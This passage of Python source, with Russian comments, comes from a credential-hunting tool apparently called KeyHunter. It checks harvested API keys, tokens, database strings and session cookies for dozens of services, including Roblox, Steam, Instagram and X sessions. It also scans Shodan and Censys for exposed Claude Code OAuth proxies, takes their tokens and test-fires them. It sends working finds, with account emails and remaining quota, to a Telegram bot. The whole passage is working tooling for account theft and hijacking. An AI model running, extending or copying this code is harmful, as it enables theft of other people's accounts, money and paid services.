    # Bearer, но листят модели по x-api-key.
    hdrs = (bearer(key), {"x-api-key": key, "anthropic-version": "2023-06-01"})
    first = True
    for suffix in suffixes:
        for hdr in hdrs:
            try:
                r = http("GET", base_r + suffix, timeout=(2.5, 6), headers=hdr)
            except Exception:
                if first:
                    # первый же запрос не прошёл — борд недоступен, кэшируем
                    with _BOARD_HEALTH_LOCK:
                        _BOARD_UNREACHABLE.add(base_r)
                    return None
                first = False
                continue
            first = False
            if r.status_code == 200:
                try:
                    j = r.json()
                    data = j.get("data") if isinstance(j, dict) else j
                    if isinstance(data, list):
                        ids = [m.get("id", "") for m in data if isinstance(m, dict)]
                        if ids:
                            return ids
                except Exception:
                    pass
    return None


def validate(key, base_hint, tag, origin):
    """Полная валидация. Не дропаем ключ, пока не убедились что он мёртв."""
    if tag == "anthropic":
        v = validate_anthropic(key)
        if v is None and str(key).startswith("sk-ant-oat01"):
            # CC-proxy слоты: oat01 живёт на хосте-прокси (shodan/netlas:IP:port),
            # а не на api.anthropic.com — пробуем origin-хост как base
            m = re.search(
                r"(?:shodan|netlas|censys)[: ](\d+\.\d+\.\d+\.\d+:\d+)", str(origin)
            )
            if m:
                v = validate_oat01_proxy(key, m.group(1))
        return v
    if tag == "anthropic-refresh":
        return validate_ort01(key)
    if tag == "anthropic-web":
        return validate_sid01(key)
    if tag == "openai-web":
        return validate_openai_web(key)
    if tag == "aws":
        return validate_aws(key, origin)
    if tag == "slack":
        return validate_slack(key, origin)
    if tag == "anthropic-admin":
        # АУДИТ-фикс: sk-ant-admin01 — это НЕ refresh_token: отправка в
        # validate_ort01 -> гарантированный 400 -> None -> seen-дедуп ->
        # админ-ключ терялся НАВСЕГДА. Удалённой проверки у admin01 нет
        # (Admin API требует org-id) — сохраняем как жирный лид.
        return _simple_rec(
            key,
            "https://api.anthropic.com",
            tag,
            "ANTHROPIC ADMIN KEY (org-admin: ключи/воркспейсы/биллинг орга)",
            status="listed_only",
        )
    if tag == "github":
        # АУДИТ-фикс: паттерн "github" шёл РАНЬШЕ "github-token" и перехватывал
        # те же строки -> validate_github (без Copilot-обмена), а copilot-чек
        # жил только в мёртвом copilot_sweep. Роутим через богатый валидатор:
        # /user + copilot_internal exchange = подписка Copilot в тире.
        return validate_github_token(key)
    if tag == "gitlab":
        return validate_gitlab(key)
    if tag == "replicate":
        return validate_replicate(key)
    if tag == "stripe":
        return validate_stripe(key)
    if tag == "tg-bot":
        return validate_tgbot(key)
    if tag == "email-cred":
        return validate_email_cred(key, origin)
    if tag == "kimi-web":
        return validate_kimi_web(key, origin)
    if tag == "baseten":
        return validate_baseten(key, origin)
    if tag == "db-dsn":
        return validate_db_dsn(key, origin)
    if tag == "gcookie":
        return validate_gcookie(key, origin)
    if tag == "websess":
        # жирные сессии — через спец-валидаторы (точный статус + юзернейм),
        # generic-дифф как фолбэк
        kstr = str(key)
        if ".ROBLOSECURITY" in kstr:
            v = validate_roblox(kstr, origin)
            return v if v is not None else validate_websess(key, origin)
        if "steamLoginSecure" in kstr:
            v = validate_steam(kstr, origin)
            return v if v is not None else validate_websess(key, origin)
        if "instagram.com" in kstr and "sessionid" in kstr:
            v = validate_instagram(kstr, origin)
            return v if v is not None else validate_websess(key, origin)
        if "auth_token" in kstr and ("twitter.com" in kstr or "x.com" in kstr):
            v = validate_xtwitter(kstr, origin)
            return v if v is not None else validate_websess(key, origin)
        return validate_websess(key, origin)
    if tag == "jwt":
        return validate_jwt(key, origin)
    if tag == "discord":
        return validate_discord(key)
    if tag == "airtable":
        return validate_airtable(key)
    if tag == "notion":
        return validate_notion(key)
    if tag == "sendgrid":
        return validate_sendgrid(key)
    if tag == "google":
        return validate_google(key)
    if tag == "codex":
        return validate_codex(key)
    if tag == "codex-web":
        return validate_codex(key, web=True)
    if tag == "github-token":
        return validate_github_token(key)
    if tag == "laravel-appkey":
        # удалённо не валидируется (ключ симметричный, применяется локально
        # к куке приложения) — но ценность огромная: форж любой сессии
        return {
            "key": key,
            "base": base_hint or "",
            "tag": tag,
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "LARAVEL APP_KEY — форж сессии любого юзера приложения",
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "listed_only",
        }
    if tag == "gocspx":
        # client secret без client_id напрямую не проверить — ищем id в
        # контексте (обычно рядом: client_id=...apps.googleusercontent.com)
        cid = ""
        try:
            cid = (
                re.search(
                    r"[0-9]{9,}-[a-z0-9]{20,}\.apps\.googleusercontent\.com",
                    str(origin) or "",
                )
                or [None]
            )[0] or ""
        except Exception:
            pass
        return {
            "key": key,
            "base": base_hint or "",
            "tag": tag,
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "Google OAuth client secret%s"
            % (" | client_id: " + cid if cid else ""),
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "listed_only",
        }

    if tag == "cloudflare":
        return validate_cloudflare(key)
    if tag == "npm":
        return validate_npm(key)
    if tag == "linear":
        return validate_linear(key)
    if tag == "figma":
        return validate_figma(key)
    if tag == "twilio":
        return validate_twilio(key, origin)
    if tag == "shopify":
        return validate_shopify(key, origin)
    if tag == "cursor-web":
        return validate_cursor_web(key, origin)
    if tag == "supabase-auth":
        return validate_supabase_auth(key, origin)
    if tag == "supabase":
        return validate_supabase_mgmt(key, origin)
    if tag == "elevenlabs":
        return validate_elevenlabs(key)
    if tag == "huggingface":
        return validate_huggingface(key)
    if tag == "perplexity":
        return validate_perplexity(key)
    if tag == "jina":
        return validate_jina(key)
    if tag == "voyage":
        return validate_voyage(key)
    # ==== OSINT-ВОЛНА 2026-09-10 ====
    if tag == "doppler":
        return validate_doppler(key)
    if tag == "terraform":
        return validate_terraform(key)
    if tag == "digitalocean":
        return validate_digitalocean(key)
    if tag == "square":
        return validate_square(key)
    if tag == "postman":
        return validate_postman(key)
    if tag == "dropbox":
        return validate_dropbox(key)
    if tag == "mailchimp":
        return validate_mailchimp(key)
    if tag == "dockerhub":
        return validate_dockerhub(key)
    if tag == "rubygems":
        return validate_rubygems(key)
    if tag == "heroku":
        return validate_heroku(key)
    if tag == "datadog":
        return validate_datadog(key)
    if tag == "mailgun":
        return validate_mailgun(key)
    if tag == "facebook":
        return validate_facebook(key)
    if tag == "google-oauth-token":
        return validate_google_oauth_token(key)
    if tag in LEAD_ONLY_TIERS:
        return validate_lead(key, tag, origin, base_hint)
    if tag == "sentry":
        # для полной валидации нужен org slug — жирный лид
        return {
            "key": key,
            "base": base_hint or "",
            "tag": tag,
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "Sentry org token (логи/исходники — нужен org slug)",
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "listed_only",
        }

    bases = try_bases(base_hint, tag)
    bases = [b for b in bases if not bad_base(b)]  # мусорные base-hint'ы вон

    # ФАЗА 1: голый ключ без базы -> сначала быстрый /models-проба по ВСЕМ базам
    # (relay-борды + хардкод), находим какая база отвечает 200 с моделями.
    # ids сохраняем в _phase1_ids и переиспользуем ниже — те же базы не пробуем
    # дважды (раньше bases[:8] прогонялись через probe_models повторно).
    _phase1_ids = {}
    if not base_hint and len(bases) > 6:
        hits = []
        # _models_probe_fast не плодит под-потоки -> можно держать широкий пул
        # без взрыва тредов (probe_models со своим 6-тред пулом так нельзя).
        n_workers = min(40, len(bases))
        with concurrent.futures.ThreadPoolExecutor(max_workers=n_workers) as ex:
            futs = {ex.submit(_models_probe_fast, b, key): b for b in bases}
            for f in concurrent.futures.as_completed(futs):
                try:
                    ids = f.result(timeout=9)
                    if ids:
                        hits.append((futs[f], ids))
                        _phase1_ids[futs[f]] = ids
                except Exception:
                    continue
        if hits:
            # берём базу с наибольшим числом звёздных моделей
            hits.sort(key=lambda x: -sum(1 for i in x[1] if STAR_RE.search(i)))
            bases = [hits[0][0]] + [b for b, _ in hits[1:]]
        # если ни одна база не ответила — ключ мёртв/не отсюда

    # SPEEDUP: /models по базам — одним параллельным пакетом, но переиспользуем
    # результаты ФАЗЫ 1 (было: bases[:8] пробивались probe_models повторно =
    # лишняя волна из ~8 запросов на каждый мёртвый тэглесс-ключ).
    bases_pre = bases[:8]
    _ids_cache = {b: _phase1_ids[b] for b in bases_pre if b in _phase1_ids}
    _need_probe = [b for b in bases_pre if b not in _ids_cache]
    if _need_probe:
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=min(8, len(_need_probe))
        ) as ex:
            futs = {ex.submit(probe_models, b, key): b for b in _need_probe}
            for f in concurrent.futures.as_completed(futs):
                try:
                    _ids_cache[futs[f]] = f.result()
                except Exception:
                    pass
    saw_net_error = False  # сеть/таймауты: возможно нужная база не ответила
    for base in bases_pre:
        ids = _ids_cache.get(base)
        stars = sorted({i for i in (ids or []) if STAR_RE.search(i)}, key=_star_rank)
        # модели для чат-пробы: звёздные приоритетно (opus-4-8 первым), иначе универсальные
        probe_list = (
            stars[:3]
            or [m for m in (ids or [])[:3]]
            or ["gpt-4o-mini", "gpt-4o", "deepseek-chat"]
        )
        working, states_detail = [], {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
            futs = {ex.submit(quick_chat, base, key, m): m for m in probe_list}
            for f in concurrent.futures.as_completed(futs):
                try:
                    state, detail = f.result()
                    states_detail[futs[f]] = state
                    if state == "working":
                        working.append(futs[f])
                except Exception:
                    states_detail["net"] = "error"
                    continue
        working.sort()
        # классификация
        if working:
            status = "working"
            # АНТИ-universal-key (расширено): чат "200" подозрителен, если
            # (а) модели не листятся вовсе, ИЛИ (б) ключ generic-тега (skgen/
            # sk20/sk32/sklong — туда падают слаги вида sk-002-role-...).
            # Контрольная проба ЗАВЕДОМО мёртвым ключом: если и он "работает",
            # эндпоинт не проверяет ключи вообще -> это open-relay, а не находка.
            if not ids or tag in ("skgen", "sk20", "sk32", "sklong", "bearer"):
                ctrl_key = "sk-kh-ctrl-" + hashlib.sha1(key.encode()).hexdigest()[:24]
                cst, _ = quick_chat(base, ctrl_key, probe_list[0])
                if cst == "working":
                    status = "open_relay"
        elif all(s == "no_balance" for s in states_detail.values()) and states_detail:
            status = "no_balance"  # валидный ключ, но денег нет
        elif all(s == "invalid_key" for s in states_detail.values()) and states_detail:
            # 401 на ЭТОЙ базе: ключ может быть чужим для неё (deepseek-ключ
            # против openai.com = 401). НЕ убиваем — пробуем следующую базу.
            continue
        elif ids:
            # Чистый 401 от ЛЮБОГО чат-проба = ключ на этой базе мёртв, точка.
            # Раньше listed_only прилипал, когда часть проб 401'ила, а часть
            # таймаутила (жирный /models у aimlapi/ppq): мусор летел в TG как
            # "🟡 модели листятся". 401 сильнее сетевого шума — дальше по базам.
            if any(s == "invalid_key" for s in states_detail.values()):
                continue
            # PUBLIC_MODELS_BASES (хардкод, проверено живьём 2026-09-10):
            # aimlapi/ppq отдают /models (937 шт) вообще БЕЗ auth — listed_only
            # на них доказывает НОЛЬ. Контрольная проба ниже при сетевом флаке
            # fail-open'ит (мусорные слаги sk-Foto-... спамили TG) — хардкод
            # закрывает детерминированно.
            if base.rstrip("/") in PUBLIC_MODELS_BASES:
                continue
            # АНТИ-authless-models: aimlapi/ppq и ко листят /models БЕЗ auth —
            # тогда listed_only ничего не доказывает о ключе (мусорные слаги
            # получали "звёзды" и летели в стор/TG). Контроль заведомо мёртвым
            # ключом: если модели листятся и ему — база не гейтит /models.
            ctrl_key = "sk-kh-ctrl-" + hashlib.sha1(key.encode()).hexdigest()[:24]
            try:
                ids_ctrl = probe_models(base, ctrl_key, timeout=(6, 12))
            except Exception:
                ids_ctrl = None
            if ids_ctrl:
                continue  # /models публичный у этой базы — ключ бессмысленен
            if ids_ctrl is None and tag in (
                "skgen",
                "sk20",
                "sk32",
                "sklong",
                "bearer",
            ):
                continue  # контроль флакнул (сеть) — fail-CLOSED для дженериков:
                # лучше потерять один listed_only, чем спамить TG слагами
            status = "listed_only"  # модели есть, чат не пробился (сеть/модель)
        else:
            saw_net_error = True  # база недоступна/неясно — не смерть
            continue  # пробуем следующий base
        # SPEEDUP: баланс + embed + rerank — одним параллельным пакетом
        em = next((i for i in (ids or []) if EMBED_RE.search(i)), None)
        rr = next((i for i in (ids or []) if RERANK_RE.search(i)), None)
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
            bal_f = ex.submit(probe_balance, base, key)
            em_f = ex.submit(quick_embed, base, key, em) if em else None
            rr_f = ex.submit(quick_rerank, base, key, rr) if rr else None
            bal = bal_f.result()
            embed_ok = bool(em_f and em_f.result())
            rerank_ok = bool(rr_f and rr_f.result())
        return {
            "key": key,
            "base": base,
            "tag": tag,
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": (ids or [])[:400],
            "n_models": len(ids or []),
            "stars_listed": stars,
            "stars_working": working,
            "balance": quota_usd(bal),
            "tier": tier_from(bal),
            "usage": bal.get("usage"),
            "embed": embed_ok or None,
            "rerank": rerank_ok or None,
            "status": status,
        }
    # все базы перебрали. Чистые 401 везде = мёртв. Сетевые ошибки = ретрай.
    if not saw_net_error:
        return None  # все базы явно отвергли ключ (401) — точно мёртв
    # сеть/таймауты: нужная база могла не ответить — "unverified" для ретрая
    return {
        "key": key,
        "base": base_hint or (bases[0] if bases else ""),
        "tag": tag,
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": None,
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "unverified",
    }


# ------------------------------------------------------------------ CC-PROXY SWEEPER
def cc_proxy_sweep(cycle=0):
    """Автоохота на Max-слоты CC-OAuth прокси:
    shodan setup_token -> GET / (живой токен) -> fat-тест -> стор + TG."""
    try:
        page = (cycle % 12) + 1
        hosts = []
        # P0.3: пул — dict {"accounts":[...]} ИЛИ голый list; поле key/api_key.
        # Раньше _pool.sort(...) над dict -> AttributeError -> тихий except ->
        # _sk="" -> return [] (sweep молча умирал без CFG["shodan_key"]).
        _sks = []
        if CFG.get("shodan_key"):
            _sks.append(CFG["shodan_key"])
        try:
            _data = json.load(open(SHODAN_KEYS_FILE, encoding="utf-8"))
            _pool = _data.get("accounts", []) if isinstance(_data, dict) else _data
            _pool = [a for a in _pool if isinstance(a, dict)]
            _pool.sort(key=lambda x: -(x.get("query_credits", 0) or 0))
            for _a in _pool:
                _k = _a.get("key") or _a.get("api_key") or ""
                if _k and _k not in _sks:
                    _sks.append(_k)
        except Exception:
            pass
        if not _sks:
            return []
        # фолбэк по ключам: 403 (кредиты кончились) -> следующий ключ пула
        r = None
        _sk_used = None
        for _sk in _sks[:4]:
            try:
                r = requests.get(
                    "https://api.shodan.io/shodan/host/search",
                    params={
                        "key": _sk,
                        "query": 'http.html:"setup_token"',
                        "page": page,
                    },
                    timeout=(10, 30),
                    verify=False,
                )
                if r.status_code == 200:
                    _sk_used = _sk
                    break
                # Любой неуспешный ответ не должен блокировать следующий
                # аккаунт пула (403 чаще означает исчерпанную квоту).
                r = None
                continue
            except Exception:
                r = None
                continue
        if r is not None and r.status_code == 200:
            for m in r.json().get("matches") or []:
                hosts.append("%s:%s" % (m.get("ip_str"), m.get("port")))
        # каждый 3-й цикл: +хосты с oauthAccount/claudeAiOauth баннерами
        # (другие cc-proxy форки, свежее покрытие)
        if cycle % 3 == 0 and _sk_used:
            for q2 in (
                'http.html:"claudeAiOauth"',
                'http.html:"oauthAccount"',
                'http.html:"sk-ant-oat01"',
                'http.html:".claude.json"',
                'http.html:"oauth-2025-04-20"',
            ):
                try:
                    r2 = requests.get(
                        "https://api.shodan.io/shodan/host/search",
                        params={"key": _sk_used, "query": q2, "page": 1},
                        timeout=(10, 30),
                        verify=False,
                    )
                    if r2.status_code == 200:
                        for m in r2.json().get("matches") or []:
                            hosts.append("%s:%s" % (m.get("ip_str"), m.get("port")))
                except Exception:
                    continue
        # + эндпоинты из Netlas/Censys (второй+третий краулеры — новое покрытие!)
        # Фильтр: слоты живут на портах 8xxx-10xxx (22/80/443/3000 — мусор экономим)
        # P0.5: не ставим этот пул первым. В censys_endpoints.json может быть
        # 1000+ записей; при порядке _nl_hosts + hosts лимит 200 отбрасывал
        # свежую Shodan-страницу ещё до probe.
        _nl_hosts = []
        for _ep_file in (
            "netlas_endpoints.json",
            "censys_endpoints.json",
            "internetdb_endpoints.json",
        ):
            try:
                _nl = json.load(open(os.path.join(HERE, _ep_file), encoding="utf-8"))
                for _h in list(_nl.keys()):
                    try:
                        _port = int(str(_h).rsplit(":", 1)[1])
                        if _port >= 8000:
                            _nl_hosts.append(_h)
                    except Exception:
                        _nl_hosts.append(_h)
            except Exception:
                pass
        # Ротация большого пула сохраняет покрытие, но гарантирует, что
        # свежие Shodan-хосты и дополнительные запросы попадут в probe.
        if _nl_hosts:
            _nl_rot = int(time.time() // 600)
            _nl_start = (_nl_rot * 60) % len(_nl_hosts)
            _nl_hosts = [
                _nl_hosts[(_nl_start + i) % len(_nl_hosts)]
                for i in range(min(60, len(_nl_hosts)))
            ]
        hosts = hosts + _nl_hosts
        # + залежи прошлой разведки: 5615 хостов с setup_token в баннерах
        # (shodan-дампы) — ротируем по циклам, по 60 шт
        try:
            _all_hosts = json.load(
                open(r"C:\Temp\opencode\all_setup_hosts.json", encoding="utf-8")
            )
            if isinstance(_all_hosts, list) and _all_hosts:
                _cur = (cycle * 60) % len(_all_hosts)
                hosts += [str(h) for h in _all_hosts[_cur : _cur + 60] if ":" in str(h)]
        except Exception:
            pass
        if not hosts:
            return []

        def probe(addr):
            # несколько путей + обе схемы: форки cc-proxy отдают токен по-разному
            for scheme in ("http", "https"):
                for path in ("/", "/setup", "/status", "/api/status"):
                    try:
                        rr = requests.get(
                            "%s://%s%s" % (scheme, addr, path),
                            timeout=(4, 7),
                            verify=False,
                        )
                        if rr.status_code != 200:
                            continue
                        body = rr.text or ""
                        if (
                            "oat01" not in body
                            and "setup_token" not in body
                            and "sid01" not in body
                        ):
                            continue
                        try:
                            d = rr.json()
                        except Exception:
                            d = {}
                        # nested data{} (часть форков прячет токен уровнем глубже)
                        dd = d.get("data") if isinstance(d.get("data"), dict) else {}
                        tok = (
                            d.get("setup_token")
                            or d.get("setupToken")
                            or d.get("token")
                            or dd.get("setup_token")
                            or dd.get("token")
                            or ""
                        )
                        if not str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01")):
                            # фолбэк: токен прямо в тексте (не-JSON форки)
                            # + sid01-сессии (форки выдают сессионные ключи)
                            mm = re.search(
                                r"sk-ant-(?:oat01|sid01)-[A-Za-z0-9_\-]{20,}", body
                            )
                            tok = mm.group(0) if mm else ""
                        if str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01")):
                            acct = (
                                d.get("account")
                                or d.get("claudeAiOauth")
                                or dd.get("account")
                                or {}
                            )
                            return addr, tok, (acct if isinstance(acct, dict) else {})
                    except Exception:
                        continue
            return None

        live = []
        # дедуп + до 200 хостов (P1.2: было 180)
        _seen_addrs = set()
        _targets = [h for h in hosts if not (h in _seen_addrs or _seen_addrs.add(h))]
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
            for res in ex.map(probe, _targets[:200]):
                if res:
                    live.append(res)
        if not live:
            return []

        def _fat_test(lv):
            """Боевая проба слота. -> dict|None (параллелится ниже)."""
            addr, tok, acct = lv
            H = {
                "x-api-key": tok,
                "anthropic-version": "2023-06-01",
                "Content-Type": "application/json",
            }
            rr = None
            for scheme in ("http", "https"):
                try:
                    r0 = requests.post(
                        "%s://%s/v1/messages" % (scheme, addr),
                        headers=H,
                        json={
                            "model": "claude-opus-4-8",
                            "max_tokens": 6,
                            "messages": [{"role": "user", "content": "hi"}],
                        },
                        timeout=(6, 15),
                        verify=False,
                    )
                    # break только на ДЕФИНИТИВНОМ ответе (было: любой ответ,
                    # даже 404/500 на http, запрещал попытку https)
                    if r0.status_code in (200, 401, 403, 429):
                        rr = r0
                        break
                    rr = r0  # запомним, но даём второй схеме шанс
                except Exception:
                    continue
            try:
                if rr is None:
                    return None
                if rr.status_code == 200:
                    status = "working"
                elif rr.status_code == 429 and "would exceed" in rr.text:
                    status = "quota"
                else:
                    return None
                # свежесть слота: остаток недельной квоты
                u7d = rr.headers.get("anthropic-ratelimit-unified-7d-utilization")
                u5h = rr.headers.get("anthropic-ratelimit-unified-5h-utilization")
                return {
                    "host": addr,
                    "token": tok,
                    "account": acct,
                    "status": status,
                    "u7d": u7d,
                    "u5h": u5h,
                }
            except Exception:
                return None

        fat = []
        # параллельный fat-test (было: последовательно — 50 хостов x ~40с
        # таймаутов могли подвесить цикл на десятки минут)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            for fres in ex.map(_fat_test, live):
                if fres:
                    fat.append(fres)

        # ДЕДУП: стор/TG только для НОВЫХ слотов или флипа статуса (анти-спам)
        _known_path = os.path.join(HERE, "cc_sweep_known.json")
        _known = {}
        try:
            _known = json.load(open(_known_path, encoding="utf-8"))
        except Exception:
            pass
        for f in fat:
            _prev = _known.get(f["host"])
            _is_new = _prev is None
            _flip = (not _is_new) and (_prev.get("status") != f["status"])
            _known[f["host"]] = {
                "status": f["status"],
                "key": f["token"],
                "u7d": f.get("u7d"),
                "ts": time.time(),
            }
            if not (_is_new or (_flip and f["status"] == "working")):
                continue  # уже видели, статус тот же — не спамим
            try:
                store(
                    {
                        "key": f["token"],
                        "base": "http://%s/v1" % f["host"],
                        "tag": "cc-proxy",
                        "origin": "cc-sweep:%s" % f["host"],
                        "ts": time.time(),
                        "models": [],
                        "n_models": 0,
                        "stars_listed": ["claude-opus-4-8"],
                        "stars_working": [],
                        "balance": None,
                        "tier": "CC-OAuth Proxy (Max)",
                        "usage": None,
                        "embed": None,
                        "rerank": None,
                        "status": "working"
                        if f["status"] == "working"
                        else "no_balance",
                    }
                )
            except Exception:
                pass
            if f["status"] == "working":
                try:
                    post_telegram(
                        "%s🔥 MAX-СЛОТ (CC-прокси): %s\nаккаунт: %s\n5h=%s 7d=%s (остаток недели)\nbase: http://%s/v1 (x-api-key)"
                        % (
                            "🆕 " if _is_new else "♻️ ОЖИЛ ",
                            f["host"],
                            f.get("account", {}).get("user_email", "?"),
                            f.get("u5h") or "?",
                            f.get("u7d") or "?",
                            f["host"],
                        )
                    )
                except Exception:
                    pass
        try:
            json.dump(_known, open(_known_path, "w", encoding="utf-8"), indent=1)
        except Exception:
            pass
        return fat
    except Exception as e:
        log("  cc-sweep err: %s" % e)
        return []


# ------------------------------------------------------------------ REPORTER
def _disp_key(k, lim=320):
    """Ключ для ПОКАЗА (TG/desktop): длинные сессии/куки режем по центру —
    в сторе лежит полный (аудит-фикс _sess_rec), здесь только витрина."""
    k = str(k)
    if len(k) <= lim:
        return k
    half = (lim - 5) // 2
    return k[:half] + " … " + k[-half:]


def render_report(v):
    dt = datetime.datetime.fromtimestamp(
        v.get("ts") or time.time(), tz=datetime.timezone.utc
    ).strftime("%Y-%m-%d %H:%M")
    status = v.get("status", "working")
    tag = v.get("tag", "")
    # не-LLM теги: свои статус-строки, без LLM-фрейминга и секции моделей
    if tag in NON_LLM_TAGS:
        status_line = {
            "working": "🟢 ЖИВАЯ (боевой чек пройден)",
            "listed_only": "🟡 ЛИД (валидатору не хватило контекста)",
            "no_balance": "🟠 Валидно, но квота исчерпана",
        }.get(status, status)
        lines = [
            status_line,
            "🏷️ Тип: %s" % tag,
        ]
        if v.get("base"):
            lines.append("🌐 База: %s" % v["base"])
        lines += [
            "🔑 Ключ: %s" % _disp_key(v.get("key", "")),
            "📅 Дата: %s UTC" % dt,
        ]
        if v.get("tier"):
            lines.append("📊 Тир: %s" % v["tier"])
        if v.get("origin"):
            lines.append("📍 Источник: %s" % str(v["origin"])[:120])
        if v.get("note"):
            lines.append("ℹ️ %s" % v["note"])
        return "\n".join(lines)
    status_line = {
        "working": "🟢 ЖИВОЙ (чат-проба пройдена)",
        "listed_only": "🟡 Модели листятся, чат не пробился",
        "no_balance": "🟠 Ключ валиден, но баланс исчерпан",
        "open_relay": "🔓 OPEN RELAY (ключи не проверяются — бесплатный эндпоинт)",
    }.get(status, status)
    lines = [
        status_line,
        "🌐 Base URL: %s" % v.get("base", ""),
        "🔑 Ключ: %s" % _disp_key(v.get("key", "")),
        "📅 Дата: %s UTC" % dt,
    ]
    if v.get("balance") is not None:
        lines.append("💰 Баланс: %s USD" % v["balance"])
    else:
        lines.append("💰 Баланс: неизвестен (нет billing API)")
    if v.get("tier"):
        lines.append("📊 Тир: %s" % v["tier"])
    if v.get("embed") is not None or v.get("rerank") is not None:
        lines.append(
            "🧬 Embed/Rerank: embed %s · rerank %s"
            % ("✅" if v.get("embed") else "🔒", "✅" if v.get("rerank") else "🔒")
        )
    if v.get("origin"):
        lines.append("📍 Источник: %s" % str(v["origin"])[:120])
    if v.get("note"):
        lines.append("ℹ️ %s" % v["note"])
    # АУДИТ-фикс: .get с дефолтами — легаси-запись без этих полей роняла
    # render -> постинг молча скипался (except в post_finding_now)
    stars_working = v.get("stars_working") or []
    stars_listed = v.get("stars_listed") or []
    models = v.get("models") or []
    n_models = v.get("n_models") or len(models)
    lines += ["", "🧩 Модели:"]
    if stars_working:
        lines.append("✅ Работают (chat-проба): ⭐ " + ", ⭐ ".join(stars_working))
    elif stars_listed:
        lines.append("📋 В списке: ⭐ " + ", ⭐ ".join(stars_listed[:6]))
    listed = [i for i in models if i not in set(stars_listed)][:25]
    rest = n_models - len(listed) - len(stars_listed)
    if listed:
        tail = " … (+%d ещё)" % rest if rest > 0 else ""
        lines.append("📋 Листятся: " + ", ".join(listed) + tail)
    return "\n".join(lines)


def tg_discover_chat():
    """Авто-дискавери chat_id: если пользователь отправил /start боту —
    ловим его chat id через getUpdates и сохраняем в конфиг."""
    if not CFG["tg_token"]:
        return None
    if CFG.get("tg_chat"):
        return CFG["tg_chat"]
    try:
        r = http(
            "GET",
            "https://api.telegram.org/bot%s/getUpdates?limit=20" % CFG["tg_token"],
            timeout=(10, 20),
        )
        if r is None or r.status_code != 200:
            return None
        updates = r.json().get("result") or []
        for u in updates:
            msg = (
                u.get("message")
                or u.get("channel_post")
                or u.get("my_chat_member")
                or {}
            )
            chat = msg.get("chat") or {}
            cid = chat.get("id")
            if cid:
                # сохраняем в конфиг навсегда
                CFG["tg_chat"] = cid
                try:
                    cfg2 = json.load(open(CONFIG_PATH, encoding="utf-8"))
                    cfg2["tg_chat"] = cid
                    json.dump(
                        cfg2,
                        open(CONFIG_PATH, "w", encoding="utf-8"),
                        ensure_ascii=False,
                        indent=2,
                    )
                except Exception:
                    pass
                log(
                    "🎯 TG chat_id автозахвачен: %s (тип: %s)" % (cid, chat.get("type"))
                )
                # подтверждение юзеру
                post_telegram("✅ KeyHunter подключён! Находки будут прилетать сюда.")
                return cid
    except Exception:
        pass
    return None


def post_telegram(text):
    if not CFG["tg_token"]:
        return False
    if not CFG.get("tg_chat"):
        tg_discover_chat()
    if not CFG.get("tg_chat"):
        return False
    url = "https://api.telegram.org/bot%s/sendMessage" % CFG["tg_token"]
    ok = True
    for i in range(0, len(text), 3900):
        try:
            r = http(
                "POST",
                url,
                timeout=(8, 25),
                json_body={
                    "chat_id": CFG["tg_chat"],
                    "text": text[i : i + 3900],
                    "disable_web_page_preview": True,
                },
            )
            if r is not None and r.status_code not in (200,):
                # chat_id невалиден (юзер удалил чат?) — сброс и редискавери
                try:
                    if "chat not found" in (r.text or ""):
                        CFG["tg_chat"] = ""
                except Exception:
                    pass
                ok = False
        except Exception:
            ok = False
    return ok


def post_finding_now(v, post=True):
    """📨 МГНОВЕННЫЙ TG-постинг: находка валиднулась -> сразу в бота.
    Не ждём конца цикла (раньше пачкой в конце — теряли скорость доставки).
    Фильтр тот же: только ценное (звёзды/подписки/деньги), хлам и no_balance —
    в стор, но не в чат. Ставит v["_tg_posted"]=True при отправке."""
    try:
        rep = render_report(v)
        log("\n" + rep + "\n" + "─" * 50)
        status = v.get("status", "working")
        is_free_oat = (
            v.get("tag") == "anthropic"
            and status == "listed_only"
            and str(v.get("key", "")).startswith("sk-ant-oat")
        )
        # ХЛАМ НЕ НУЖЕН: постим только ценное — звёздные модели,
        # подписочные/денежные теги, жирный баланс.
        star_hit = bool(v.get("stars_working") or v.get("stars_listed"))
        valuable_tag = v.get("tag") in (
            "anthropic",
            "anthropic-refresh",
            "anthropic-web",
            "anthropic-admin",
            "cc-proxy",
            "gcookie",
            "websess",
            "db-dsn",
            "discord",
            "openai",
            "openai-svcacct",
            "email-cred",
            "stripe",
            "tg-bot",
            "open-infra",
            "laravel-appkey",
            "gocspx",
            "cloudflare",
            "npm",
            "twilio",
            "shopify",
            "linear",
            "roblox",
            "steam",
            "instagram",
            "x-session",
            "cursor-web",
            "supabase-auth",
            "baseten",
            "anthropic-refresh",
            "anthropic-admin",
            "codex",
            "google",
            "replicate",
        )
        # АУДИТ-фикс: ЛЮБАЯ не-LLM запись со статусом working ценна по
        # определению (её валидатор — боевой чек). Без этого openai-web
        # (ChatGPT Plus-сессия!), aws-пары, slack-токены молча падали в
        # стор без поста — «алмазы» не долетали до чата.
        nonllm_working = v.get("tag") in NON_LLM_TAGS and status == "working"
        fat_balance = (v.get("balance") or 0) >= 1
        many_models = (v.get("n_models") or 0) >= 100
        # quota-fresh правило: MAX с выжженным окном квоты — в стор, не в чат.
        # окно обнуляется за ~5ч, но «победой» с нулевым остатком не спамим
        quota_burned = "выжжено" in str(v.get("tier") or "") or "выжжено" in str(
            v.get("note") or ""
        )
        if (
            post
            and status in ("working", "listed_only")
            and not is_free_oat
